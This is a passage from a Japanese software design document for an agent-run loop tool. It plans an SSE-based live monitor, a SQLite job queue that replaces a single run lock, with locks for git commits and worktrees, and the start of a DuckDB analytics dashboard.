`fetch` streaming(ReadableStream)は POST/ヘッダ自由度が要るとき有利だが、ここは GET + 自動再接続 + Last-Event-ID が欲しいだけなので **`EventSource` を採用**。再接続・Last-Event-ID 付与・`event:` 名でのハンドラ分岐が標準で付く。認証ヘッダ問題(EventSource はカスタムヘッダを付けられない)はセクション4の認証設計に委ねる(Cookie ベースなら EventSource でも送出される。トークン方式ならクエリ付与かサーバ側 Cookie へ載せ替え)。

```ts
// hooks/useRunLive.ts
export function useRunLive(runId: string) {
  const [events, setEvents] = useState<TranscriptEvent[]>([]);
  const [done, setDone] = useState(false);
  useEffect(() => {
    const es = new EventSource(`/api/runs/${runId}/live`);   // 同一オリジン rewrite 経由
    es.addEventListener("transcript", (e) =>
      setEvents((prev) => [...prev, JSON.parse(e.data)]));
    es.addEventListener("done", () => { setDone(true); es.close(); });
    es.addEventListener("phase", (e) => {/* role バッジ更新 */});
    es.onerror = () => {/* EventSource が自動再接続。Last-Event-ID は自動付与 */};
    return () => es.close();   // ★タブ離脱・アンマウントで必ず close（リーク防止）
  }, [runId]);
  return { events, done };
}
```

Next の `next.config.js` の rewrites で `/api/*` を uvicorn(別プロセス)へプロキシし、ブラウザからは同一オリジンに見せる(CORS・EventSource の素直さのため)。

#### コンポーネント構成(shadcn/ui)

- **monitor トップ(`/monitor`)**: `useMonitorStream()` が `/api/monitor/stream` を購読。`runs[]` を **`grid grid-cols-1 lg:grid-cols-2` の Card** で並べる(並行 run 同時表示の器)。各 Card に `Badge`(phase)・経過秒・`Progress` 風の phase ステッパ(Explorer/Implementer/Verifier)。Card クリックでライブ詳細へ。
- **ライブ run 詳細(`/monitor/live/[id]` または `/run/[id]` のライブタブ)**: `useRunLive(id)`。役割タブは shadcn **`Tabs`**(Explorer / Implementer / Verifier)。各タブ内は `transcript` イベントを `cls` ごとにスタイル分け(`user`/`assistant`/`think`/`tool`/`result`)。`collapse:true` は `Collapsible`(`<details>` 相当)で初期折り畳み。`done` 受信で「完了」`Badge`、`heartbeat` で「接続中」インジケータを最新化。
- **自動スクロール**: 末尾追従は「ユーザーが最下部にいるときだけ」追従(途中を読んでいるときに飛ばさない)。これは UI ヒントであり事実改変ではない。

役割タブは N 役固定(3)なので grid ではなく Tabs。**run の grid(monitor トップ)** と **role の tabs(run 詳細)** は別レイヤである点に注意。

### 3.6 パフォーマンス / リーク対策

| 懸念 | 対策(決定) |
|---|---|
| SSE 接続の上限 | uvicorn は async なので接続あたりスレッドは消費しないが、**サーバ側で同時 SSE 接続数を上限(例 32)**にする依存注入カウンタを入れ、超過は 429。単一オペレータ前提では十分。 |
| tail ポーリング間隔 | transcript は 0.4s、monitor は 0.5s。stream は数百ms〜秒で 1 イベントなので体感差は無く、stat 1 回/0.4s は無視できる負荷。**inotify/watchdog は不採用**(macOS 互換と依存増を避ける)。 |
| タブ離脱時クローズ | フロントは `useEffect` cleanup で必ず `es.close()`。サーバは **`request.is_disconnected()` を毎 tick チェック**してジェネレータを抜ける(切断検出が無いと tail ループが孤児化する)。 |
| 完了 run のフル再送コスト | `done` 後にクライアントが close するので無限ループにはならない。長大 transcript はサーバ側で 1 行ずつ stream するためメモリは O(1)(全読みしない)。 |
| 半端な行(flush 途中) | `tail_jsonl` は `\n` 終端行のみ確定(オフセットを進めない)。`runner.run_role` は 1 行ごと flush なので行が割れる窓は短い。 |
| 再接続の重複/欠落 | `id:` に `seq` を載せ、再接続時は `Last-Event-ID` までスキップ。`monitor_stream` は冪等(常に現在値)なので id 管理不要。 |

### 3.7 推奨(このセクションの確定事項)

1. **meta refresh を全廃**し、`GET /api/runs/{id}/live`(個別)と `GET /api/monitor/stream`(全体)の 2 本の SSE に置換する。
2. transcript の畳み込みは**サーバ側**で行い、`_parse_transcript` を `runner.py` へ移設して REST/SSE/確定表示で共有する(ロジック二重化を避ける)。
3. tail は **stat ポーリング(0.4s)**、monitor は **poll-then-push(0.5s, 差分時 push)**。watchdog 不採用。
4. 受信は **`EventSource`**。`done` で close、cleanup で close、サーバは `is_disconnected()` で孤児化防止。
5. `monitor_stream` の data は**最初から `{"runs":[...]}` 配列**にし、`.run.lock`(単一)→`runs/*/.status.json`(複数)の供給差し替えだけで並列(セクション4)へ拡張する。UI は単一/複数を区別しない。
6. SSE で流すのは事実イベントと表示折り畳みフラグのみ。**要約・推奨・自動入力は流さない**(中心思想の硬い制約)。進行中 run は loop.db に触れず `*.stream.jsonl`/`.run.lock` のみを真実とする。

### 3.8 移行メモ(実装者向け)

- 削除対象: `monitor_live.html` の meta refresh、`webapp/main.py:225` の `monitor_live`(サーバレンダ版)。`monitor`(`webapp/main.py:210`)の初期データは Next 側の初回 fetch(REST `/api/monitor` 相当)+ SSE 購読に置換。
- 残す: `_read_run_status`・`_parse_transcript`(runner へ移設後)・`_evidence`。これらは SSE/REST から再利用。
- 新規ファイル: `webapp/sse.py`(`tail_jsonl` / `fold_line` / `sse` ヘルパ)。`runner.py` に `_parse_transcript` と 1 行版 `fold_line` を集約。
- `runner.run_role` は変更不要(既に逐次 flush 済み、`runner.py:353-355`)。SSE 化は読み取り側のみの変更で、実行系・契約には手を入れない。

---

<a id="4"></a>

## 4. runner の並列実行(スケールの本丸 / 別トラック)

### 4.0 冒頭宣言 — これは GUI 刷新と「別トラック」である

このセクションが扱う「複数 run の同時実行」は、**今回の Web GUI 刷新(SSE / ダッシュボード / レビュー UX / リモート認証)とは別のトラック**である。両者を混同しないことが設計上もっとも重要な前提になる。

理由は構造的に明確で、現状の本質的ボトルネックは **GUI ではなく `runner.py` の `cmd_run` が `data/.run.lock` を `os.O_EXCL` で取って run を完全に直列化している点**にある(`runner.py:896-902`)。

```python
# runner.py cmd_run より(抜粋)
lock = DATA / ".run.lock"
try:
    os.close(os.open(str(lock), os.O_CREAT | os.O_EXCL | os.O_WRONLY))
except FileExistsError:
    print("別の run が進行中です(data/.run.lock)。完了を待つか、残留なら削除してください。")
    return 1
```

この lock は「単一オペレータの atomic claim」として意図的に置かれている(`/dispatch` 連打で同一タスクを 2 プロセスが拾い `loop/<run_id>` ブランチが衝突するのを防ぐ)。つまり **lock 自体はバグではなく安全装置**であり、GUI をいくら高速化・並行表示対応にしても、この lock がある限り同時に走る run は常に 1 本である。

したがって本トラックの目標は「`.run.lock`(単一 `O_EXCL`)による全直列を、N 並行のジョブキューへ置き換える」ことに尽きる。そして **GUI 側はこの置き換えが完了する前から「N 本同時前提」で先に作っておく**(接続点は §4.7)。GUI が N 本を表示・監視できる状態を先に作っておけば、本トラックが後から差し込まれても GUI の作り直しは発生しない。

> 中心思想との整合: 本トラックは種類A(メカニクス=dispatch / 実行 / 証拠収集 / コミット / インデックス)の領域に閉じる。並列化は「判断」を一切生成しない。`## 判断` セクションは並列下でも空のまま出力され、人間が後から書く(§4.4)。`loop.db` は引き続き MD 派生の使い捨てインデックスで、ジョブキューを `loop.db` に持たせても **キュー状態は authoritative ではない**(§4.2 で reindex 不変条件を明示)。

---

### 4.1 現状の直列構造の解剖(どこを外すか)

`cmd_run`(`runner.py:888-939`)が直列化に効かせている要素は次の 3 つで、置き換え時にそれぞれ個別に対処する。

| 直列化要素 | 場所 | 役割 | 並列化で必要な対応 |
|---|---|---|---|
| `data/.run.lock`(`O_EXCL`) | `runner.py:896-902` | 全 run の atomic claim | **ジョブキューの claim 機構へ置換**(§4.2) |
| `auto_commit(DATA, ...)` | `runner.py:872, 795` ほか | data/ git repo への checkpoint commit | **commit を単一ワーカーへ集約 / 直列化**(§4.3) |
| `add_worktree` / `remove_worktree` | `runner.py:255-268` | run ごとの隔離 worktree | run_id スコープで衝突しないが `worktree add` 競合は要確認(§4.5) |

重要なのは、`.run.lock` は claim と「Web 監視が読むステータスファイル」を兼ねている点(`write_run_status`, `runner.py:280-293`)。`.run.lock` が JSON ステータスを上書きしているため、**N 本走ると 1 ファイルにステータスを混ぜることになり破綻する**。並列化では claim とステータスを必ず分離する(§4.2 / §4.6)。

`_run_attempt`(`runner.py:779-886`)自体は、引数で `run_id` を受け取り `RUNS / run_id` ディレクトリと `WORKTREES_DIR / run_id` を使う構造になっており、**run_id でスコープされていて互いに状態を共有しない**。つまり `_run_attempt` は既に「N 並行で呼んでも論理的に独立」に近い。残る共有資源は (a) data/ への commit、(b) `loop.db` 書き込み、(c) `update_status`(タスクファイルの front-matter 書き換え)の 3 点に限られる。これらを直列化すれば `_run_attempt` 本体はほぼそのまま並列実行できる。

---

### 4.2 ジョブキュー設計 — 推奨: SQLite job 表(ただし「使い捨て」原則を死守)

#### 案の比較

**案A: file ベースキュー(`data/queue/<state>/<job_id>.json` を `os.rename` で原子的に状態遷移)**
- 利点: 依存ゼロ。file-based contract と思想が揃う。`rename` は同一 FS で atomic。
- 欠点: 「次の 1 件を claim する」のに全 pending を走査して `rename` を試行 → 競合リトライが必要。ワーカー数が増えると効率が落ちる。並行 worktree 数の上限カウントを別途ファイルロックで持つ必要があり、結局ロックが増える。

**案B: SQLite job 表(`UPDATE ... WHERE state='queued' ... LIMIT 1` で claim、`BEGIN IMMEDIATE` で直列化)**
- 利点: claim が 1 トランザクションで原子的・効率的。同時実行数上限は `SELECT count(*) WHERE state='running'` で自然に表現できる。SQLite は単一プロセス内・複数スレッド or 単一ホスト複数プロセスからの逐次書き込みに十分。
- 欠点: `loop.db` を authoritative に見せかける誘惑が生まれる(思想違反リスク)。

#### 推奨(決定): **案B(SQLite job 表)を採用する。ただしキュー専用の別 DB `data/queue.db` に置き、`loop.db` とは厳密に分離する。**

`loop.db` は「MD 派生の使い捨てインデックス、reindex で完全再生成可能」という不変条件を持つ。ジョブキューはランタイムの一過性状態であって MD からは再生成できない(完了した run は MD になるが、queued / running の途中状態は MD にならない)。両者を同じ DB に同居させると `reindex` の「`loop.db` は捨てて MD から作り直せる」が崩れる。

したがって:
- **`data/loop.db`**: 従来どおり MD 派生インデックス(authoritative ではない)。本トラックでは一切いじらない。
- **`data/queue.db`**(新規): ジョブキューの一過性状態のみ。`.gitignore` 済みにする(commit しない)。プロセス再起動で running が残骸化したら起動時に掃除する(§4.6)。`queue.db` が消えても **既存 run の MD・証拠・git 履歴は完全に無傷**(queued タスクは `data/tasks/*.md` の `status: todo` から再投入できる = ここでも file-based contract が真実)。

> 思想チェック: `queue.db` は「単一の真実」ではない。真実は `data/tasks/*.md` の `status` と `runs/<id>.md` の存在である。`queue.db` は「いま何を走らせている最中か」の揮発キャッシュにすぎず、失われても契約データから再構築できる。この性質を実装コメントと §4.2 のスキーマ脇に明記すること。

#### job 表スキーマ(`data/queue.db`)

```sql
CREATE TABLE IF NOT EXISTS jobs (
  job_id      TEXT PRIMARY KEY,         -- ULID 等。run_id とは別(再試行で run_id が枝分かれするため)
  task_id     TEXT NOT NULL,            -- data/tasks/<task_id>.md
  run_id      TEXT,                     -- 実行開始時に runner が採番(base run_id)。claim 前は NULL
  state       TEXT NOT NULL,            -- 'queued' | 'running' | 'done' | 'failed' | 'canceled'
  repo_label  TEXT,                     -- resolve 後のラベル(表示・worktree add 直列化キー)
  enqueued_at TEXT NOT NULL,
  started_at  TEXT,
  finished_at TEXT,
  worker_pid  INTEGER,                  -- 起動時の残骸検出用(死活確認)
  verdict     TEXT,                     -- 完了後の最終 verdict(表示用キャッシュ。真実は run MD)
  error       TEXT
);
CREATE INDEX IF NOT EXISTS idx_jobs_state ON jobs(state);
```

`task_id` に対する重複 enqueue 防止は、`state IN ('queued','running')` の同一 `task_id` を弾く部分ユニーク制約 or claim 時チェックで行う(`.run.lock` が防いでいた「同一タスクを 2 重に拾う」をここで再現する)。

#### claim(atomic) のコードスケッチ

```python
# queue.py(新規)。loopdb とは別モジュール。
import sqlite3

def claim_next_job(conn: sqlite3.Connection, max_concurrency: int) -> dict | None:
    """queued の先頭 1 件を running に遷移して返す。同時実行上限を超えるなら None。
    BEGIN IMMEDIATE で書き込みロックを取り、claim の原子性を保証する(.run.lock の置換)。"""
    conn.execute("BEGIN IMMEDIATE")
    try:
        running = conn.execute(
            "SELECT count(*) FROM jobs WHERE state='running'").fetchone()[0]
        if running >= max_concurrency:
            conn.rollback()
            return None
        row = conn.execute(
            "SELECT job_id, task_id FROM jobs WHERE state='queued' "
            "ORDER BY enqueued_at LIMIT 1").fetchone()
        if not row:
            conn.rollback()
            return None
        job_id, task_id = row
        conn.execute("UPDATE jobs SET state='running', started_at=? , worker_pid=? "
                     "WHERE job_id=?", (now_iso(), os.getpid(), job_id))
        conn.commit()
        return {"job_id": job_id, "task_id": task_id}
    except Exception:
        conn.rollback()
        raise
```

`BEGIN IMMEDIATE` により、複数ワーカーが同時に claim しても 1 件ずつ逐次に処理され、同一ジョブの二重 claim は起きない。これが `os.O_EXCL` の atomic claim を SQLite トランザクションへ置き換えた中核である。

#### 同時実行数の上限制御

- `loop.toml` に `[loop] max_concurrency = 1`(**デフォルト 1 = 現状と同一挙動**)を追加する。
- `max_concurrency = 1` のときキューは「単一直列」に退化し、`.run.lock` 時代と機能的に等価になる。これが移行の安全弁:**デフォルトで挙動が変わらない**。
- 上限を上げるかどうかは人間が `loop.toml` で明示宣言する(GUI は推奨値を提示しない = 種類B に踏み込まない)。

#### 「単一オペレータ前提」をどこまで崩すか(決定)

崩すのは「同時に走る run は 1 本」という制約だけ。**「キューに投入できるのは単一ホスト・単一データ owner」という前提は維持する。** マルチユーザ・分散ワーカーには踏み込まない(`dispatch` がサーバ上で `claude -p` を Bash 許可で起動する = リモートコード実行の露出という別論点があり、ここは §「リモート/モバイル+認証」トラックの localhost 固定方針に従う)。本トラックのワーカーは「同一ホスト内のスレッド or 子プロセスを N 本」に限定する。

---

### 4.3 data/ への auto_commit の直列化(必須)

`auto_commit(DATA, ...)`(`runner.py:296-305`)は `data/` git repo に対し `git add` → `git commit` を行う。`git commit` は内部で `.git/index.lock` を取るため、**N 本の run が同時に `auto_commit(DATA, ...)` を呼ぶと `index.lock` 競合で commit が失敗・取りこぼす**。これは並列化で最初に壊れる箇所であり、対処必須。

`auto_commit` が data/ へ commit する呼び出し点は run 完了時(`runner.py:872`)、repo 不正時(`795`)、`cmd_gen`(`520`)、review 系(`699, 774`)。このうち run 並列実行で同時多発するのは **`runner.py:872` の run 完了 commit**。

#### 案の比較

- **案I: 全 data/ commit を単一「committer ワーカー」に集約**(各 run は「commit 要求」をキューに積むだけ)。
- **案II: data/ commit 専用のプロセス内 `threading.Lock` で直列化**(同一プロセスで N 本走らせる前提なら最も単純)。
- **案III: file lock(`data/.commit.lock` を `O_EXCL` でスピン取得)**(複数プロセスワーカーでも効く)。

#### 推奨(決定): **案II + 案III の二段。**

- ワーカーを「同一プロセス内 N スレッド」で実装する場合(§4.6 の推奨構成)→ `threading.Lock` で `auto_commit(DATA, ...)` を囲む。最小実装で確実。
- 将来ワーカーを別プロセス化する場合に備え、`auto_commit` 内部に **data/ 宛のときだけ** `data/.commit.lock` の `O_EXCL` スピンロック(短時間・指数バックオフ・タイムアウト付き)も入れておく。worktree への commit(`commit_worktree`, `runner.py:271-277`)は **対象 repo 側**であり data/ ではないので、この直列化対象外(repo が同一でも worktree が run_id で別ブランチなので index は worktree ごとに独立。ただし §4.5 参照)。

```python
_DATA_COMMIT_LOCK = threading.Lock()  # 同一プロセス内ワーカー向け

def auto_commit(repo: Path, paths: list[Path], message: str) -> None:
    rels = [str(p.relative_to(repo)) for p in paths if p and p.exists()]
    if not rels:
        return
    is_data = repo.resolve() == DATA  # data/ への commit だけ直列化する
    lock = _DATA_COMMIT_LOCK if is_data else contextlib.nullcontext()
    with lock:  # data/ の .git/index.lock 競合を防ぐ
        git(repo, "add", *rels)
        if git(repo, "diff", "--cached", "--quiet").returncode == 0:
            return
        git(repo, "commit", "-q", "-m", message)
```

> 副作用の注意: 直列化により data/ commit はわずかにスループット律速になるが、commit は秒未満で run 本体(分オーダー)に対し無視できる。コミットを取りこぼさないことが最優先。

`update_status`(`runner.py:104-116`)と `loopdb.upsert_md`(`runner.py:869`)も data/ 側ファイル・`loop.db` への書き込みなので、同じ `_DATA_COMMIT_LOCK` 区間 or 専用ロックで囲んで run 完了処理(`update_status` → `upsert_md` → `auto_commit`、`runner.py:866-872`)を 1 ブロックとして直列化するのが安全(SQLite の `loop.db` は WAL 化しておくと並行読みと衝突しにくい)。

---

### 4.4 冪等性・再試行・no-repo・timeout kill が並列下で壊れないか

並列化で既存の安全機構が壊れないことを 1 つずつ確認する。

**(a) 再試行(`max_attempts`)** — `cmd_run`(`runner.py:927-936`)のループは 1 タスク内で `base` → `base-retry2` と run_id を枝分かれさせ、**同一タスクの再試行は同一ワーカー内で逐次**に行われる。並列化してもこの再試行ループは「1 ジョブ = 1 ワーカーが最後まで(再試行込みで)担当」とすれば不変。再試行を別ジョブに分割してはいけない(worktree とブランチの整合が崩れる)。ジョブ = 「タスク 1 件を確定まで」の単位とする。

**(b) 冪等性** — `_run_attempt` は毎回新しい `WORKTREES_DIR / run_id` と新ブランチ `loop/<run_id>` を作る(`runner.py:255-264`)。run_id は時刻秒まで含む(`runner.py:921`)。**異なるジョブは異なる run_id → 異なる worktree dir → 異なるブランチ**なので、worktree・ブランチ・`runs/<id>/` 証拠ディレクトリは並行で衝突しない。これは並列化の追い風で、既存設計がそのまま効く。

**(c) no-repo タスク** — `no_repo` 経路(`runner.py:799-801, 882-883`)は `WORKTREES_DIR / run_id` を `mkdir` し終了時に `shutil.rmtree` する。run_id スコープなので並行衝突なし。git を触らないので index 競合も無関係。**並列下で最も安全な経路。**

**(d) timeout kill** — `run_role` の `threading.Timer`(`runner.py:348-349`)は **そのワーカースレッド/プロセスのローカル**で動き、`proc.kill()` するのは自分が起動した子プロセスだけ(`runner.py:341-346`)。N 本走っても各 run の Timer は自分の `claude -p` 子だけを kill する。グローバル状態を持たないので並列で壊れない。

**(e) 失敗 run の隔離** — `_run_attempt` は `try/finally` で必ず worktree を `remove_worktree`(repo)or `rmtree`(no-repo)する(`runner.py:881-885`)。あるジョブが例外で落ちても finally で自分の worktree を片付け、他ジョブには波及しない。**ジョブワーカーの最上位でも例外を捕捉**し、`jobs.state='failed'` + `error` 記録に落として他ワーカーを巻き込まないこと(下記)。

```python
def run_one_job(job: dict, cfg: dict, conn) -> None:
    try:
        rc = cmd_run_core(job["task_id"], cfg)   # cmd_run から lock 取得を剥がした中身
        mark_job(conn, job["job_id"], "done")
    except Exception as ex:
        mark_job(conn, job["job_id"], "failed", error=repr(ex))
        # worktree 片付けは _run_attempt の finally が担当済み。ここでは隔離記録のみ。
```

> 注意: `cmd_run`(`runner.py:888`)から `.run.lock` 取得部分(`896-902`)と `finally` の `lock.unlink`(`938`)を剥がし、claim をキューに移した中身を `cmd_run_core(task_id, cfg)` として切り出す。`cmd_run` 自体は「`max_concurrency=1` で 1 件だけ claim → 実行」の薄いラッパとして残し、CLI 互換(`runner.py run [task_id]`)を保つ。

---

### 4.5 同一 repo への並行 worktree add の安全性(残る唯一の git 競合)

run_id スコープで worktree dir とブランチは衝突しないが、**同一対象 repo に対する `git worktree add` を 2 本同時に走らせると、worktree 管理メタ(`<repo>/.git/worktrees/` と `worktree add` 内部の参照更新)で稀に競合**しうる。`add_worktree`(`runner.py:255-264`)は `check=True` なので、失敗すれば例外で当該ジョブが落ちる(他は無事)が、取りこぼしは避けたい。

#### 推奨(決定): **対象 repo 単位の worktree 操作ロックを入れる。**

`add_worktree` / `remove_worktree` を **repo パスをキーにしたロック**で囲む。`worktree add` と `worktree remove` は秒未満なので、repo 単位で直列化してもスループットへの影響は無視できる。run 本体(`claude -p`、分オーダー)はロックの外なので並列性は保たれる。

```python
_WT_LOCKS: dict[str, threading.Lock] = {}
_WT_LOCKS_GUARD = threading.Lock()

def _wt_lock(repo: Path) -> threading.Lock:
    key = str(repo.resolve())
    with _WT_LOCKS_GUARD:
        return _WT_LOCKS.setdefault(key, threading.Lock())

def add_worktree(repo: Path, run_id: str) -> tuple[Path, str]:
    wt = WORKTREES_DIR / run_id
    branch = f"loop/{run_id}"
    WORKTREES_DIR.mkdir(parents=True, exist_ok=True)
    with _wt_lock(repo):  # 同一 repo への並行 worktree add/remove を直列化
        subprocess.run(["git", "-C", str(repo), "worktree", "add", "-b", branch, str(wt), "HEAD"],
                       check=True, capture_output=True, text=True)
    return wt, branch
```

別プロセスワーカー構成にする場合は repo ごとの file lock(`<repo>/.git/loop-worktree.lock`)に置き換える。`異なる`対象 repo どうしは完全並行(ロックが別キー)。

> 補足: `commit_worktree`(`runner.py:271-277`)は worktree 内(`loop/<run_id>` ブランチ)への commit で、worktree ごとに独立した index を持つため直列化不要。ただし `git worktree` は共有 `.git` を参照するので、念のため worktree commit も同 repo ロックに含めても害はない(秒未満)。安全側で含めることを推奨。

---

### 4.6 ワーカーの起動形態と残骸回収

#### 推奨(決定): **uvicorn(FastAPI)プロセス内のバックグラウンドワーカープール(`threading` ベース、`max_concurrency` 本)。**

理由:
- 既存方針が「runner/loopdb を FastAPI から直接 import してロジック二重化を避ける」である。ワーカーも同一プロセス内スレッドにすれば、`_DATA_COMMIT_LOCK` / `_WT_LOCKS` などのプロセス内ロックがそのまま効き、IPC が要らない。
- `_run_attempt` 内の重い処理(`claude -p`)はすべて **`subprocess` への外部委譲**で、GIL を待たずに並行する。Python 側はストリーム tail と JSON パースが主で CPU 律速ではない。よって `threading` で実用上十分(`multiprocessing` のオーバーヘッド不要)。

構成:
- uvicorn 起動時に「ディスパッチャ・ループ」を 1 本立てる:queue.db を一定間隔(or イベント駆動)で見て `claim_next_job` し、空きスレッドへ `run_one_job` を投げる。
- API の `dispatch` 系エンドポイントは **キューへ enqueue するだけ**(`jobs` に 1 行 INSERT)。即時に `claude -p` を起動しない(現状は `subprocess.Popen` で runner.py を起動、`webapp/main.py`)。これにより「N 本同時」と「上限制御」が一元化される。

#### 残骸(stale running)の回収

- プロセスが落ちると `state='running'` のジョブが残る。**uvicorn 起動時に、`running` 行のうち `worker_pid` が生存していない(`os.kill(pid, 0)` で `ProcessLookupError`)ものを `failed`(or `queued` へ再投入)に掃除**する。
- 同様に `WORKTREES_DIR` に残った孤児 worktree(対応する `running` ジョブがない)を `git worktree prune` + ディレクトリ削除で起動時に回収する。これは現状 `.run.lock` 残留時に「残留なら削除してください」(`runner.py:900`)と人手に委ねていた掃除の自動化に相当。

---

### 4.7 GUI を「N 本同時前提」で先に作っておく接続点(本トラック未着手でも先行可能)

本トラックが後回しでも、GUI 側はいま N 本前提で作る。接続点を具体化する。

1. **ステータスは `.run.lock` を読むのをやめ、`queue.db`(将来)または「個別ステータスファイル」を読む。**
   現状 `write_run_status`(`runner.py:280-293`)は `.run.lock`(claim 兼ステータス)に **単一 run のステータスを上書き**している。N 本では破綻するので、**run ごとに `data/runs/<run_id>/status.json` を書く**ように `write_run_status` を変更し、claim(lock / queue)とステータスを分離する。GUI / SSE は「全 `runs/*/status.json`」を集約して並行 run リストを出す。
   - これは `max_concurrency=1` の現状でも無害に先行導入できる(1 本ぶんの `status.json` を書くだけ)。
   - JSON 形(現行フィールドを踏襲):
     ```json
     {"run_id": "2026-06-16-...-task", "task": "task-id",
      "repo": "/path or none", "started_at": "ISO8601",
      "phase": "explorer|implementer|verifier|done", "verdict": null}
     ```

2. **SSE / 監視 API は「run の配列」を返す形にする(1 本でも配列)。**
   `GET /api/runs/live` → 全 active run の `status.json` を集約した配列を SSE で push。GUI は配列を map して N カード描画。`max_concurrency=1` のときは要素 1 の配列が流れるだけで、UI は同じコードで動く。

3. **キュー API を先に用意し、実体は「即時 1 本実行」でスタブしておく。**
   - `POST /api/jobs`(`{task_id, repo}`)→ 本トラック後は enqueue、未着手時は現行どおり 1 本だけ `cmd_run` を起動。
   - `GET /api/jobs`(queued / running / 直近 done の一覧)→ 未着手時は「running 高々 1・queued 空」を返すスタブ。
   GUI のキュー表示・並行カード・「あと N 件待ち」表示を先に実装しておけば、本トラック投入時に **API シグネチャ据え置きで中身だけ差し替え**られる。

4. **GUI は判断に踏み込まない(思想ガード)。** 並行 run を並べて表示しても、GUI は各 run の verdict・証拠・キュー位置という**事実**だけを出す。「この run を優先せよ」「これは信用できる」等の推奨・要約・自動入力は一切しない(`## 判断` は引き続き人間が空欄に書く)。並列化は表示する run の本数を増やすだけで、判断の自動化には一切寄与しないことを UI コピーでも明示する。

---

### 4.8 推奨タイムライン(決定)

**本トラックは「フェーズ後半で着手」を推奨する(完全スコープ外にはしない)。**

- フェーズ前半(GUI 刷新本体)で、§4.7 の (1)(2)(3) — すなわち **`status.json` 分離・SSE 配列化・キュー API スタブ** — を「N 本前提の器」として先に作る。これらは `max_concurrency=1` のまま無害に入れられ、後戻りを生まない。
- フェーズ後半で、`queue.db` + `claim_next_job` + `_DATA_COMMIT_LOCK` + repo 単位 worktree ロック + 残骸回収を実装し、`loop.toml` の `max_concurrency` を 1 → N に上げる。**デフォルトは 1 のまま**にし、N へ上げるのは人間の明示判断に委ねる。

この順序なら、最も壊れやすい「data/ への commit race / index.lock 競合」(§4.3)と「同一 repo の worktree add 競合」(§4.5)を、GUI を一度も作り直さずに後から安全に差し込める。

---

### 4.9 思想整合チェックリスト(実装者向け)

- [ ] `queue.db` は `loop.db` と**別ファイル**で、`.gitignore` 済み・**authoritative ではない**(真実は `tasks/*.md` の status と `runs/<id>.md`)。
- [ ] `loop.db` の reindex 不変条件(MD から完全再生成可能)を一切壊していない(キュー状態を `loop.db` に混ぜていない)。
- [ ] 並列化は種類A のみ。`## 判断` は空のまま出力され、GUI は推奨/要約/自動入力をしない。
- [ ] `auto_commit(DATA, ...)` を直列化し、index.lock 競合で commit を取りこぼさない。
- [ ] 各 run の worktree・ブランチ・証拠は run_id スコープで衝突しない(既存設計を維持)。
- [ ] timeout kill・失敗 run 隔離・no-repo 経路・`max_attempts` 再試行が並列下でワーカーローカルに完結する。
- [ ] `max_concurrency` デフォルト 1 = 現状と完全等価。N へ上げるのは人間の明示宣言(`loop.toml`)。

---

<a id="5"></a>

## 5. 分析ダッシュボード

焦点は、現状 CLI 止まりの DuckDB 分析レンズ(`stats.py` + `queries/*.sql`)を **JSON API + チャート**へ引き上げ、skill 版ごとの pass 率・コスト推移・gaming 傾向を可視化することである。ここでの絶対原則は「ダッシュボードは事実の集計表示のみで、判断(種類B)を一切生成しない」。閾値超過に「危険」「要改善」等のラベルや推奨を付けない。境界の引き方を本節で明記する。

### 5.1 現状の接地(実コード)

- `stats.py`(リポジトリルート相対 `stats.py`)は DuckDB を**状態を持たないレンズ**として使う。`make_con()` が `duckdb.connect()`(インメモリ)→ `INSTALL sqlite; LOAD sqlite;` → `ATTACH '<DB>' AS src (TYPE sqlite)` → `CREATE VIEW runs AS SELECT * FROM src.runs` の順で、SQLite の `loop.db` を読み取りビューとして開く。authoritative state は一切持たない。
- DB パスは `loop.toml` の `[data] dir`(既定 `data`)から `data/loop.db` を解決する。`runner.py` 側でも同一の `DB = DATA / "loop.db"`、`RUNS = DATA / "runs"` が定義済み(`runner.py:51-52`)。API プロセスは `runner` を import 済みなので **`runner.DB` を唯一の真実のパスとして再利用**し、`stats.py` の `_db_path()` を二重実装しない。
- `loop.db` のスキーマは `loopdb.py:19-40` の `runs` 単一テーブル。分析で使う主要列: `verdict`、`reviewed`(INTEGER 0/1)、`cost_usd`(REAL)、`turns`(INTEGER)、`skill_sha`、`started_at`(TEXT)、`test_verdict`、`verifier_verdict`、`verifier_confidence`、`task`、`run_id`、`md_path`。
- `loop.db` は MD 派生の**使い捨てインデックス**。`loopdb.reindex(conn, RUNS)` で `runs/*.md` の front-matter から全件再生成できる(`loopdb.py:111-118`)。**authoritative ではない。** ダッシュボードはこの DB を読むが、それはあくまで MD 契約の派生ビューを見ているにすぎない、という位置づけを UI 上も崩さない(5.6)。
- canned クエリ 3 本(いずれも `queries/` 相対):
  - `pass_rate_by_skill.sql` — `skill_sha` ごとに `AVG(CASE WHEN verdict='pass' THEN 1 ELSE 0)` = pass_rate、`AVG(cost_usd)`、`COUNT(*)`。
  - `verdict_summary.sql` — `verdict` ごとに件数 `n`、未レビュー数 `SUM(reviewed=0)`、平均コスト・平均ターン。
  - `gaming_suspects.sql` — `test_verdict IN ('pass','none') AND verifier_verdict='fail'` の run 一覧(`run_id, task, test_verdict, verifier_verdict, verifier_confidence, started_at`)。コメントが明記する通り「最重要の R&D シグナル(種類B が読むべき run の優先候補)」。

### 5.2 アーキテクチャ決定: DuckDB をどう・どこで開くか

**推奨(決定): API プロセス内で、リクエストごとに DuckDB のインメモリ接続を生成し、SQLite を read-only で ATTACH する。`stats.py` のロジックを再利用するために `make_con()` を「パス引数を取る純関数」へ小リファクタし、FastAPI から import する。**

理由と却下案:

| 案 | 内容 | 判定 |
|---|---|---|
| A: 別プロセスで `stats.py` を subprocess 実行し stdout をパース | プロセス分離は綺麗だが、人間向け整形出力(`run_sql` の ljust)を機械パースする羽目になり脆い。起動コストも毎回かかる | 却下 |
| B(推奨): `stats.py` を関数化して API から直接 import、DuckDB をインメモリ接続 | ロジック二重化なし(刷新方針「runner/loopdb の直接 import を維持」と整合)。DuckDB インメモリは状態なしで毎回作り捨て可。SQLite は read-only ATTACH で安全 | **採用** |
| C: DuckDB を使わず loopdb(SQLite)へ素の SQL を直接投げる | 依存が減るが、`stats.py`/`queries/*.sql` 資産を捨てることになり、CLI と API でクエリが二重化する。集計の表現力も SQLite で十分とはいえ DuckDB の方が将来の分析拡張に強い | 却下(CLI/API のクエリ単一化を優先) |

read-only の担保: ATTACH を `ATTACH '<DB>' AS src (TYPE sqlite, READ_ONLY)` とし、ダッシュボード経路では一切書き込まない。これは「Explorer/Verifier を `--disallowedTools` で read-only 強制する」のと同じ思想を API 層にも適用するもの(分析は観測であって統制ではない)。

`stats.py` の最小リファクタ(`stats.py` 相対):

```python
